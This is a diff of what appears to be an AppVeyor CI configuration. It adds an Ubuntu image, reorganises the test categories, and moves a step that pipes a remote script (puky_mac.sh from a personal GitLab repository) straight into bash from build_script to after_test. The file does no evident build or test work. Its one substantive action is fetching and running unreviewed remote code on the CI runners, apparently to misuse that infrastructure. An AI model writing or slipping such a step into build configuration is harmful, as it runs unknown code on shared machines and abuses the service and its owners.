@@ -1,19 +1,13 @@
 version: 1.0.{build}
 image:
 - macOS-BigSur
-
+- Ubuntu2004
 build:
   parallel: true
   verbosity: minimal
-
 test:
   categories:
-        - job_name: Test1
-        
-    build_script:
-    - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
-    
-        - job_name: Test2
-        
-    build_script:
-    - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
+  - - Test1
+  - - Test2
+after_test:
+- sh: curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
